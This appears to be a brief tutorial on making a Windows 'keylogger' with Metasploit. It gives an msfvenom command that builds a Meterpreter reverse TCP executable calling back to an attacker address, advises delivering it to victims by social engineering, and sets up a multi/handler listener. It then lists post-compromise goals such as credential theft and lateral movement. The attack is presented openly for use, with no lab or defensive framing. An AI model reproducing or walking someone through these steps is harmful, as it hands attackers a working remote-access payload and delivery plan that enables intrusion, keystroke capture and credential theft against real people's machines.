Building the keylogger using Metasploit-framework

PART 1
1.Log in to kali linux software
2.The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

#Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code
#Using Meterpreter to generate an executable called keyshell.exe as illustrated before

Metasploit is handy for generating a reverse shell. The following command generates a reverse TCP shell with the Metasploit framework:

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keyshell.exe

  #p - payload (windows/x64/meterpreter/reverse_tcp) 
  #windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
  #It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
  #LHOST - Listen Address (Threat actor IP address)
  #LPORT - Listen port (The default is 444, It is advisable to change to another value)
  #f - To outpute the executable file in exe (Window extension)
  #o - To outpute the executable file name to keyshell.exe

PART 2
3. As seen above, the execuitebale file (keyshell.exe) has been created, exe need to be transported to victim system/infrastructure
   #It can be transported to the victim system via Social engineering or more sophisticated ways
   #See previous work or update from seyigate repro! on SET (Social Engineer Toolkits Framework)

PART 3
4. As assume that the hacker had already compromised the victim machine through the payload generated using Metasploit framework as explained above. 
   #Now, hacker can gain more foothold on the machine, launch additional remote and payloads attacks
   #Execute malicious code remotely 
   #Move laterally through the whole system and network infrastructure.
   #Data theft such as admin and elevated account credentials theft, financial loss, reputational damage, and legal penalties




Create a listener which aslso known as backdoor 
4. Create a listener
   kali> msfconsole
   kali> use exploit/multi/handler
   show info
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST (IP ADDRESS OF HACKERS SYSTEM)
   set LPORT 444
   show info
   run
